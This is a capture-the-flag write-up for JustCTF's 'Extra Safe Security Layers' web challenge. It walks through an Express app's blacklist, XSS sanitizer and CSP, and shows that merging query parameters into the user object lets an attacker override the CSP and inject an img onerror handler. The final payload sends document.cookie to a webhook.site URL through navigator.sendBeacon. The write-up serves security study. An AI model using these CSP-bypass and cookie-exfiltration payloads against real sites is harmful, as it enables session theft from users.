---
title: "JustCTF Extra Safe Security Layers writeup"
author: "0xMesbaha"
cover: "/media/CTFs/Flag.png"
tags: ["CTF", "XSS", "CSP"]
date: 2023-06-04T12:49:18+34:08
draft: false
categories:
  - Web Exploitation 
---

This Challenge is about exploiting cross site scripting with a strict CSP in place along with XSS Santizer and other restrictions , the interesting part in this blog is about learning the root cause and idenfiy exploit points. the challenge may seem very easy and it is easy and fun indeed.

<!--more-->


## Source Code Review

- we are give the following files along with the Dockerfile

```
│   app.js
│   bot.js
│   flag.txt
│   package.json
│   tempCodeRunnerFile.js
│
├───public
│       admin_background.png
│       background.png
│
└───templates
        index.ejs
```

####  **app.js**

First we have some imports and rate limiter because the challenge has one public URL For all players. also admin cookie is a random UUID value.( ``UUID Example`` : ``d29217e9-d6b2-435e-99ef-84fb52c267cb``)

```js
import express from "express";
import cookieParser from "cookie-parser";
import rateLimit from "express-rate-limit";
import { randomUUID } from "crypto";
import { xss } from "express-xss-sanitizer";
import { report } from "./bot.js";

// Rate limit for report endpoint - 1 request per minute
const limiter = rateLimit({
  windowMs: 60 * 1000,
  max: 1,
  standardHeaders: true,
  legacyHeaders: false,
});

export const adminCookie = randomUUID();
```

- Then it uses the xss sanitizer on the middleware (against any input value before processing it) and from the package.json file we got the version is ``1.1.6`` which is the latest version (at this time)
- we also see some constants SHA-1 Hashed will be used latter in the CSP


```js
app.use(xss());

const css = "sha256-vLdrwYlWaDndNN9sQ9ZZrxSq93n8/wam7RRrUaZPZuE=";
const commonJs = "sha256-hPqYpiz7JNIo+Pdm+2iyVcEpBmkLbYzZp4wT0VtRo/o=";
const defaultJs = "sha256-PxCHadKfAzMTySbSjFxfuhIk02Azy/H24W0/Yx2wL/8=";
const adminJs = "sha256-5TQWiNNpvAcBZlNow32O2rAcetDLEqM7rl+uvpcnTb8=";
```

- the default CSP seems to be very strict and properly configured as we can't load external scripts other than if the SHA1 hash value matches the constants above and other same for other directives :(

```js
const defaultCSP = `default-src 'none'; img-src 'self'; style-src '${css}'; script-src '${commonJs}' '${defaultJs}'; connect-src 'self';`;
```
- and we have some blacklisted words

```js
const blacklist = [
  "fetch",
  "eval",
  "alert",
  "prompt",
  "confirm",
  "XMLHttpRequest",
  "request",
  "WebSocket",
  "EventSource",
];
app.use(cookieParser());
app.use(express.json());
```
- and now let's Jump to the juicy part , for any request the following security layers are applied 
- First thing it makes sure the requested parameter does not include any of the blacklisted words

```js
app.use((req, res, next) => {
  if (req.query) {
    // Safety layer 2
    const s = JSON.stringify(req.query).toLowerCase();
    for (const b of blacklist) {
      if (s.includes(b.toLowerCase())) {
        return res.status(403).send("You are not allowed to do that.");
      }
    }
```
- next make sure it is ASCII Printable (range 32 to 127)

```js
    // Safety layer 3
    for (const c of s) {
      if (c.charCodeAt(0) > 127 || c.charCodeAt(0) < 32) {
        return res.status(403).send("You are not allowed to do that.");
      }
    }
  }
```
- if there is an admin cookie equals to the UUID Value from above it will have some values for the ``res.user`` object as following  , it sets the background for admin and the hash values are corresponding to admin constants.

```js  
  if (req.cookies?.admin === adminCookie) { // admin cookie
    res.user = {
      isAdmin: true,
      text: "Welcome back :)",
      unmodifiable: {
        background: "admin_background.png",
        CSP: `default-src 'self'; img-src 'self'; style-src '${css}'; script-src '${adminJs}' '${commonJs}';`, // no connect self CSP 
      },
    };
  } 
  ```

- if the user is not an admin (i.e doesnot have UUID Value as admin cookie) , the user will have the normal background and the variables set are assigned to the user.

```js
  else {
    // Safety layer 4
    res.user = {
      text: "Hi! You can modify this text by visiting `?text=Hi`. But I must warn you... you can't have html tags in your text.",
      unmodifiable: {
        background: "background.png",
      },
    };
  }

  if (req.query.text) {
    res.user = { ...res.user, ...req.query }; 
  }
```
 it then checks if the request has the text parameter set , if so it will execute this line , <span style="background-color: #E5E544">the three dots operator can be used for concatenating</span>  [source](https://www.freecodecamp.org/news/three-dots-operator-in-javascript/#:~:text=How%20to%20Concatenate%20or%20Merge%20Arrays%20With%20the%20Spread%20Operator) which makes this part very interesting. it concatenates all the values of the query to the ``res.user`` object. let's keep that in mind 

```js
res.user = { ...res.user, ...req.query }; 
```

- from above snipper the normal user does not have CSP Value in the ``res.user`` because in the following code it checks if there is no CSP it will set it to the default strict CSP we have (the default one)


```js
  // Safety layer 5
res.set("Content-Security-Policy", res.user.unmodifiable.CSP ?? defaultCSP);
  next();
});
```

- Finally the endpoint report will send the text parameter in a post request 

```js
app.get("/", (req, res) => {
  res.render("index", { ...res.user });
});

app.post("/report", limiter, async (req, res) => {
  try {
    if (!req.body.text) {
      throw new Error("Invalid input.");
    }
    if (typeof req.body.text !== "string") {
      throw new Error("Invalid input.");
    }
    await report(req.body.text);
    return res.json({ success: true });
  } catch (err) {
    return res.status(400).json({ success: false });
  }
});
```


####  **bot.js**

- The bot Code Simply uses puppeteer to open a browser page and assign 2 cookies one of them for admin with httppnly so xss will not help get this cookie , and the Flag is inside the flag cookie which does not have the httponly set. it then opens the application with both cookies assigned. and with the parameters we sent as well.

```js
  const page = await browser.newPage();
  await page.setCookie({
    name: "admin",
    value: adminCookie,
    domain: "localhost",
    path: "/",
    httpOnly: true,
  });

  await page.setCookie({
    name: "flag",
    value: FLAG,
    domain: "localhost",
    path: "/",
  });

  await page.goto(`http://localhost:3000/${endpoint}`);
```

#### **index.ejs**

Checking the ``index.ejs`` file to get the dynamic parameters in the page we found 2 
```html
<div class="userBox"><%= text ?? '<h1>This shouldn\'t be here...</h1>' %></div>
```

```html
    <script>
        // load background...
        main.innerHTML += `
            <img class='background' src='<%- unmodifiable?.background %>'>
        `;
        console.log('Loaded!');
    </script>
```
## Goal 

We are against typical xss challenge where a bot visits an application vulnerable to cross site scripting and when the bot opens the page along with parameters we supply , it will be triggered and we should get the flag cookie value. However we have some obstacles here :

1- The strict CSP we got assigned because we don't have one in our user object
2- The XSS Sanitizer does not have bypasses we can use

#### Bypassing CSP
We can get around the first obstacle thanks to the vuln in the ``Safety layer 4`` Code Snippet , because if we issue following request

```
http://challenge.com/?text=test&unmodifiable[background]=admin_background.png
```

- we can see our input is reflected successfully indicating we can modify the object values ! ,as well as  add new ones :D ?

![image](/media/CTFs/extra-safe-security-layers/20230604225540.png)

- we will add a new CSP Value so that it will not assign as the default strict CSP Value , crafting the following CSP allows the browsers to load img source from external website (our webhook) and removes all other restrictions


```
img-src 'self' https://webhook.site/xxxxxxx;
```

- Sending the request

```
http://xssl.web.jctf.pro/?text=a&unmodifiable[CSP]=img-src%20%27self%27%20https://webhook.site/xxxxxxx;
```

- The new CSP Value has been assigned indeed

![image](/media/CTFs/extra-safe-security-layers/20230604230001.png)

- now we can think of allowing external scripts loading from our webhook but this will make us use ``<script src=`` at the text parameter which will not b executing due to the xss sanitizer.

#### Bypassing XSS Sanitizer 

From the ``index.ejs`` we can see this snippet , it takes the value from the ``unmodifiable.background`` and assign it to the background with img tag.

```js
main.innerHTML += ` <img class='background' src='<%- unmodifiable?.background %>'>`;
```

- what if add the value ``x' onerror=alert(1)`` will it be executed ? , well no but because of the blacklisted words and not because of the xss sanitizer 

![image](/media/CTFs/extra-safe-security-layers/20230604230540.png)

- we can trigger an xss but let's try to find a payload without the blacklisted words , how can we send request without the ``XmlHttpRequest`` ,``fetch`` . searching [here](https://developer.mozilla.org/en-US/docs/Web/API) will find the Beacon API which we can try 

```
http://xssl.web.jctf.pro/?text=a&unmodifiable[CSP]=img-src 'self' https://webhook.site/xxxxx&unmodifiable[background]=unmodifiable[background]=x' onerror="navigator.sendBeacon('https://webhook.site/xxxxxx/');"
```

- and we got a call back in the webhook , and here is our payload in the page source

![image](/media/CTFs/extra-safe-security-layers/20230604231130.png)

#### Exploiting 

- The Final Payload will do the following :
	- set text parameter so we get under the merging condition 
	- set CSP Value so we do not get the restrict default one
	- injecting onerror event in the img src tag which will be added via innerhtml 
	- onerror which will be triggered due to the invalid source will send a request to our hook along with the cookies
	- the bot will parse all these parameters and visit the application with them along with the cookies (flag cookie)

```
http://xssl.web.jctf.pro/?text=a&unmodifiable[CSP]=img-src 'self' https://webhook.site/xxxxxxxxx;&unmodifiable[background]=x' onerror="navigator.sendBeacon('https://webhook.site/xxxxxxxxx/?cookie='+encodeURIComponent(document.cookie));"
```

![image](/media/CTFs/extra-safe-security-layers/20230604232032.png)


![image](/media/CTFs/extra-safe-security-layers/20230604231749.png)